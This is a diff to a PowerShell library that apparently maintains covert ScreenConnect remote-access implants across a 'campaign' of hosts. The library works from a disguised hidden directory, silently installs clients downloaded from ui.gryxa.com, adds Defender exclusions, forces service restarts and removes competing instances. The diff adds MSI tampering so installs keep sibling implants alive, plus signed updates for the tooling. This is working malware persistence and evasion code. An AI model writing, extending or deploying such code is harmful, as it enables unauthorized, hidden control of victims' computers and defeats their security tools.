@@ -1,6 +1,6 @@
 #Requires -Version 5.1
 # ═══════════════════════════════════════════════════════════════
-# OWN_LIB  BUILD 20260804L39
+# OWN_LIB  BUILD 20260804L40
 # Shared library: per-host identity (anti-signature), WMI watchdog
 # (mutual persistence chain), campaign state file, SC service repair.
 # L39: relay-verified Gryxa keeper adoption; INFLIGHT≠HEALTHY; real -Force/-Deep;
@@ -22,7 +22,7 @@
 [CmdletBinding()]
 param(
     [Parameter(Mandatory = $true)]
-    [ValidateSet('init', 'watchdog', 'watchdog-ensure', 'tasks-ensure', 'state', 'identity', 'repair', 'registered', 'exterminate', 'gryxa-health', 'gryxa-ensure', 'sync-gryxa-fp', 'test-msi')]
+    [ValidateSet('init', 'watchdog', 'watchdog-ensure', 'tasks-ensure', 'state', 'identity', 'repair', 'registered', 'exterminate', 'gryxa-health', 'gryxa-ensure', 'sync-gryxa-fp', 'test-msi', 'protect-msi', 'verify-update', 'sync-sevrz-fp')]
     [string]$Action,
     [string]$WorkDir = 'C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache',
     [string]$MonPath = '',
@@ -359,12 +359,111 @@ $script:GryxaDefaultFp = '36e506ff016b2151'
 $script:GryxaMsiUrl = 'https://ui.gryxa.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest'
 $script:GryxaRelayHost = 'update.gryxa.com'
 $script:GryxaUiHost = 'ui.gryxa.com'
-$script:SevrzKeep = @('5f6010579852e507', 'f861c8140d453427')
+$script:SevrzDefaultPrimary = '5f6010579852e507'
+$script:SevrzDefaultAlt = 'f861c8140d453427'
+$script:SevrzKeep = @($script:SevrzDefaultPrimary, $script:SevrzDefaultAlt)
 # Set to a 16-hex FP you WANT installed (after rotating on the panel). Any host
 # running a different FP migrates to this one. Leave '' to just track whatever runs.
 $script:GryxaExpectedFp = '36e506ff016b2151'
 
+# L40: RSA public key for update.manifest verification (private key in keys/, gitignored)
+$script:UpdatePubKeyXml = @'
+<RSAKeyValue><Modulus>tABZPnvsupori19mtJbHoT1uFGVLNKqONB0xtvIBH4HpfM5U+StCuGnEdIyPykMQPjDElVBZOea8pddBxxPMI94d4VBpdwnQedWHlnl6EuQsJL2MMc0xo0duzpQdPVjDneIItOxVMnl4MmTSS8i15OfNTH6yddlfi6tNfTvvCtkxlL9c0qXxtIoYLQL9jC294t2O0vOsAlih0hS6XAGp8OATKR/KVPp8qfw8tzrSvKgYkpe79bJ67btjO7qTHv1JpP04xeYtCKjSFN6Xh02drtqvyuCHvw1+0HYfviaH5yNApwoNx/f5U63uMiirKuJaZMBvXM8umxykAGrqdSU0pQ==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>
+'@
+
 function Get-GryxaCfgPath { Join-Path $WorkDir 'gryxa.cfg' }
+function Get-SevrzCfgPath { Join-Path $WorkDir 'sevrz.cfg' }
+
+function Get-SevrzKeep {
+    $prim = $script:SevrzDefaultPrimary
+    $alt = $script:SevrzDefaultAlt
+    $p = Get-SevrzCfgPath
+    if (Test-Path -LiteralPath $p) {
+        Get-Content -LiteralPath $p -ErrorAction SilentlyContinue | ForEach-Object {
+            if ($_ -match '^PRIMARY_FP=([0-9a-fA-F]{16})\s*$') { $prim = $matches[1].ToLower() }
+            if ($_ -match '^ALT_FP=([0-9a-fA-F]{16})\s*$') { $alt = $matches[1].ToLower() }
+            if ($_ -match '^EXPECTED_PRIMARY=([0-9a-fA-F]{16})\s*$') { $prim = $matches[1].ToLower() }
+            if ($_ -match '^EXPECTED_ALT=([0-9a-fA-F]{16})\s*$') { $alt = $matches[1].ToLower() }
+        }
+    }
+    $script:SevrzKeep = @($prim, $alt)
+    return @($prim, $alt)
+}
+
+function Set-SevrzFp([string]$Primary, [string]$Alt) {
+    if (-not $Primary) { $Primary = $script:SevrzDefaultPrimary }
+    if (-not $Alt) { $Alt = $script:SevrzDefaultAlt }
+    if (-not (Test-Path -LiteralPath $WorkDir)) { New-Item -ItemType Directory -Path $WorkDir -Force | Out-Null }
+    @(
+        "PRIMARY_FP=$($Primary.ToLower())",
+        "ALT_FP=$($Alt.ToLower())",
+        "EXPECTED_PRIMARY=$($Primary.ToLower())",
+        "EXPECTED_ALT=$($Alt.ToLower())",
+        "UPDATED=$((Get-Date).ToUniversalTime().ToString('o'))"
+    ) | Set-Content -LiteralPath (Get-SevrzCfgPath) -Encoding ASCII -Force
+    $script:SevrzKeep = @($Primary.ToLower(), $Alt.ToLower())
+}
+
+function Sync-SevrzExpected([string]$ExpectedText) {
+    # Apply repo sevrz_expected.cfg body (EXPECTED_PRIMARY=/EXPECTED_ALT= lines)
+    $prim = $null; $alt = $null
+    foreach ($line in ($ExpectedText -split "`r?`n")) {
+        if ($line -match '^EXPECTED_PRIMARY=([0-9a-fA-F]{16})\s*$') { $prim = $matches[1].ToLower() }
+        if ($line -match '^EXPECTED_ALT=([0-9a-fA-F]{16})\s*$') { $alt = $matches[1].ToLower() }
+    }
+    if (-not $prim) { $prim = (Get-SevrzKeep)[0] }
+    if (-not $alt) { $alt = (Get-SevrzKeep)[1] }
+    Set-SevrzFp $prim $alt
+    return "SEVRZ|$prim|$alt"
+}
+
+function Protect-MsiSiblingSafe([string]$MsiPath) {
+    # L40: copy MSI and DELETE FROM Upgrade so /i cannot RemoveExistingProducts siblings.
+    if (-not $MsiPath -or -not (Test-Path -LiteralPath $MsiPath)) { return $null }
+    $safe = Join-Path $env:TEMP ("sc_safe_{0}.msi" -f [guid]::NewGuid().ToString('N'))
+    try {
+        Copy-Item -LiteralPath $MsiPath -Destination $safe -Force
+        $i = New-Object -ComObject WindowsInstaller.Installer
+        $db = $i.OpenDatabase((Resolve-Path -LiteralPath $safe).Path, 1)
+        try {
+            $v = $db.OpenView('DELETE FROM `Upgrade`')
+            $v.Execute() | Out-Null
+            $db.Commit()
+        } catch {}
+        return $safe
+    } catch {
+        if (Test-Path -LiteralPath $safe) { Remove-Item -LiteralPath $safe -Force -ErrorAction SilentlyContinue }
+        return $MsiPath
+    }
+}
+
+function Test-UpdateManifest([string]$ManifestPath, [string]$SigPath, [hashtable]$FileMap) {
+    # Verify RSA-SHA256 signature over update.manifest, then SHA256 of each staged file.
+    if (-not (Test-Path -LiteralPath $ManifestPath) -or -not (Test-Path -LiteralPath $SigPath)) { return 'missing' }
+    if (-not $script:UpdatePubKeyXml -or $script:UpdatePubKeyXml -match 'PLACEHOLDER') { return 'no-pubkey' }
+    try {
+        $bytes = [IO.File]::ReadAllBytes((Resolve-Path -LiteralPath $ManifestPath).Path)
+        $sig = [Convert]::FromBase64String(([IO.File]::ReadAllText((Resolve-Path -LiteralPath $SigPath).Path).Trim()))
+        $rsa = [System.Security.Cryptography.RSA]::Create()
+        $rsa.FromXmlString($script:UpdatePubKeyXml)
+        if (-not $rsa.VerifyData($bytes, $sig, [System.Security.Cryptography.HashAlgorithmName]::SHA256, [System.Security.Cryptography.RSASignaturePadding]::Pkcs1)) {
+            return 'bad-sig'
+        }
+        $doc = Get-Content -LiteralPath $ManifestPath -Raw | ConvertFrom-Json
+        foreach ($name in $FileMap.Keys) {
+            $path = $FileMap[$name]
+            if (-not (Test-Path -LiteralPath $path)) { return "missing-file:$name" }
+            $want = [string]$doc.files.$name
+            if (-not $want) { return "not-in-manifest:$name" }
+            $sha = [System.Security.Cryptography.SHA256]::Create()
+            $fs = [IO.File]::OpenRead((Resolve-Path -LiteralPath $path).Path)
+            try { $hash = ([BitConverter]::ToString($sha.ComputeHash($fs))).Replace('-', '').ToLower() }
+            finally { $fs.Close() }
+            if ($hash -ne $want.ToLower()) { return "hash-mismatch:$name" }
+        }
+        return 'ok'
+    } catch { return "error:$($_.Exception.Message)" }
+}
 
 function Get-GryxaFp {
     $fp = $script:GryxaDefaultFp
@@ -412,7 +511,7 @@ function Test-IsGryxaFp([string]$Fp) {
 
 function Get-KeepFingerprints {
     $set = New-Object 'System.Collections.Generic.HashSet[string]' ([StringComparer]::OrdinalIgnoreCase)
-    [void]$set.Add('5f6010579852e507'); [void]$set.Add('f861c8140d453427')
+    foreach ($s in (Get-SevrzKeep)) { [void]$set.Add($s) }
     if ($script:GryxaExpectedFp) { [void]$set.Add($script:GryxaExpectedFp) }
     $cfg = Get-GryxaFp
     if ($cfg -and (Test-IsGryxaFp $cfg)) { [void]$set.Add($cfg) }
@@ -645,11 +744,10 @@ function Remove-InstallerProductRegistration([string]$ProductCode) {
 
 function Start-GryxaInstall([string]$MsiPath, [string]$Fp, [string]$LogFile) {
     Add-ScDefenderExclusion $Fp
-    # L34/L35: do the ProductCode preclean INSIDE the detached wrapper so the ensure returns
-    # instantly (hosts with a ~10s Run-tool cap were killing the ensure before the install
-    # spawned). The wrapper: enable MSI -> /x the colliding ProductCode -> purge phantom
-    # Installer registration (packed GUID) -> /i clean install -> configure+start service.
-    $pc = Get-MsiProperty $MsiPath 'ProductCode'
+    # L40: sibling-safe MSI (empty Upgrade table) before /i
+    $safeMsi = Protect-MsiSiblingSafe $MsiPath
+    if (-not $safeMsi) { $safeMsi = $MsiPath }
+    $pc = Get-MsiProperty $safeMsi 'ProductCode'
     $packed = ''
     if ($pc) { $packed = ConvertTo-PackedGuid $pc }
     $cmd = Join-Path $WorkDir 'gryxa_install.cmd'
@@ -665,17 +763,18 @@ function Start-GryxaInstall([string]$MsiPath, [string]$Fp, [string]$LogFile) {
         $lines += "reg delete `"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\$pc`" /f >nul 2>&1"
         $lines += "reg delete `"HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\$pc`" /f >nul 2>&1"
     }
-    $lines += "msiexec /i `"$MsiPath`" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v `"$LogFile`""
+    $lines += "msiexec /i `"$safeMsi`" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v `"$LogFile`""
     $lines += "sc config `"ScreenConnect Client ($Fp)`" start= auto"
     $lines += "sc failure `"ScreenConnect Client ($Fp)`" reset= 86400 actions= restart/3000/restart/3000/restart/3000"
     $lines += "sc start `"ScreenConnect Client ($Fp)`""
-    # L39: Gryxa /i can RemoveExistingProducts sevrz via shared UpgradeCode — recreate keepers after.
-    foreach ($sk in $script:SevrzKeep) {
+    # L39: recreate sevrz keepers after Gryxa /i (belt+suspenders even with empty Upgrade table)
+    foreach ($sk in (Get-SevrzKeep)) {
         $lines += "sc config `"ScreenConnect Client ($sk)`" start= auto >nul 2>&1"
         $lines += "sc start `"ScreenConnect Client ($sk)`" >nul 2>&1"
     }
     $resultFile = Join-Path $WorkDir 'gryxa_install.result'
     $lines += "echo %ERRORLEVEL%>`"$resultFile`""
+    $lines += "del /f /q `"$safeMsi`" >nul 2>&1"
     $lines += "del /f /q `"$cmd`" >nul 2>&1"
     $lines += 'exit'
     Set-Content -LiteralPath $cmd -Value $lines -Encoding ASCII -Force
@@ -1184,12 +1283,15 @@ function Invoke-Exterminate {
 function Update-State {
     $keep = @(Get-KeepFingerprints)
     $gryxaFp = Get-GryxaFp
+    $sevrz = @(Get-SevrzKeep)
+    $primFp = $sevrz[0]; $altFp = $sevrz[1]
     $prim = $null; $alt = $null; $script:gryxa = $null
     foreach ($svc in (Get-Service -Name 'ScreenConnect Client*')) {
         if ($svc.Name -match '\(([0-9a-f]{16})\)') {
-            if ($matches[1] -eq '5f6010579852e507') { $prim = "$($svc.Status)" }
-            elseif ($matches[1] -eq 'f861c8140d453427') { $alt = "$($svc.Status)" }
-            elseif ($matches[1] -eq $gryxaFp) { $script:gryxa = "$($svc.Status)" }
+            $fp = $matches[1].ToLower()
+            if ($fp -eq $primFp) { $prim = "$($svc.Status)" }
+            elseif ($fp -eq $altFp) { $alt = "$($svc.Status)" }
+            elseif ($fp -eq $gryxaFp -or (Test-IsGryxaFp $fp)) { $script:gryxa = "$($svc.Status)" }
         }
     }
     $foreign = @()
@@ -1274,6 +1376,27 @@ switch ($Action) {
         $path = $Extra
         if (-not $path) { Write-Output 'no'; break }
         if (Test-MsiPackage $path $Fp) { Write-Output 'yes' } else { Write-Output 'no' }
+    }
+    'protect-msi'     {
+        $safe = Protect-MsiSiblingSafe $Extra
+        if ($safe) { Write-Output $safe } else { Write-Output 'FAIL' }
+    }
+    'verify-update'   {
+        # Extra = "manifest|sig|name=path;name2=path2"
+        $parts = $Extra -split '\|', 3
+        if ($parts.Count -lt 3) { Write-Output 'bad-args'; break }
+        $map = @{}
+        foreach ($pair in ($parts[2] -split ';')) {
+            if ($pair -match '^([^=]+)=(.*)$') { $map[$matches[1]] = $matches[2] }
+        }
+        Write-Output (Test-UpdateManifest $parts[0] $parts[1] $map)
+    }
+    'sync-sevrz-fp'   {
+        if ($Extra) { Write-Output (Sync-SevrzExpected $Extra) }
+        else {
+            $k = @(Get-SevrzKeep)
+            Write-Output ("SEVRZ|$($k[0])|$($k[1])")
+        }
     }
     'gryxa-ensure'    {
         if ($NoWait) {
